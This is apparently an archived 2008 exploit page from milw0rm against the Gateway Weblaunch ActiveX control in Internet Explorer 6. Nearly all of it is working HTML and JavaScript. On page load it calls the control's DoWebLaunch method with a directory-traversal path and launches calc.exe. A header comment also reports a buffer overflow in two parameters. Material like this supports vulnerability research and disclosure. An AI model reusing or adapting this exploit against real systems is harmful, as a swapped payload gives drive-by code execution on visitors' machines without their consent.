<!-- 
Gateway Weblaunch ActiveX Control Insecure Method Exploit
Implemented Categories:
Category: Safe for Initialising
Category: Safe for Scripting
Written by e.b.
Tested on Windows XP SP2(fully patched) English, IE6, weblaunch.ocx version 1.0.0.1
This method is also vulnerable to a buffer overflow in the 2nd and 4th parameters
-->
<html>
 <head>
  <title>Gateway Weblaunch ActiveX Control Insecure Method Exploit</title>
  <script language="JavaScript" defer>
    function Check() {
     
                //escape from systemdrive\documents and settings\username\local settings\temp
		obj.DoWebLaunch("","..\\..\\..\\..\\windows\\system32\\calc.exe","","");
          
    } 
   
   </script>
  </head>
 <body onload="JavaScript: return Check();">
    <object id="obj" classid="clsid:93CEA8A4-6059-4E0B-ADDD-73848153DD5E" height="0" width="0">
     Unable to create object
    </object>
 </body>
</html>

# milw0rm.com [2008-01-08]